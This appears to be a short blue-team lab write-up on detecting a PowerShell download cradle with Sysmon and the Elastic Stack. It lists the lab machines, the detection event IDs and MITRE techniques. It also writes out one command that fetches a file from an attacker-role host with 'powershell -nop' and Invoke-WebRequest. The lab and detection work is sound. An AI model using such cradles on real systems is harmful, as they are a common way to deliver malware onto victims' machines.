# Case 04 - PowerShell Download Cradle

## Objective

Detect and investigate PowerShell download activity using Sysmon and Elastic Stack.

## Lab Environment

| Machine     | Role                   | IP Address     |
| ----------- | ---------------------- | -------------- |
| Kali Linux  | Attacker / HTTP Server | 192.168.56.102 |
| Windows 10  | Victim                 | 192.168.56.103 |
| Host Laptop | Elastic + Kibana       | 192.168.56.1   |

## Attack Scenario

A PowerShell command was used to download a file from a Python HTTP server hosted on the Kali Linux machine. The activity generated process creation and network connection events which were collected by Sysmon and forwarded to Elasticsearch through Winlogbeat.

## Commands Used

### Kali Linux

```bash
python3 -m http.server 8000
```

### Windows 10

```powershell
powershell.exe -nop -c "Invoke-WebRequest http://192.168.56.102:8000/test.txt -OutFile C:\Temp\test.txt"
```

## Detection Method

* Sysmon Event ID 1 (Process Creation)
* Sysmon Event ID 3 (Network Connection)

## Findings

* Process Name: powershell.exe
* Command: Invoke-WebRequest
* Source IP: 192.168.56.103
* Destination IP: 192.168.56.102

## MITRE ATT&CK

* T1059.001 - PowerShell
* T1105 - Ingress Tool Transfer

## References

* Investigation.md
* MITRE-Mapping.md
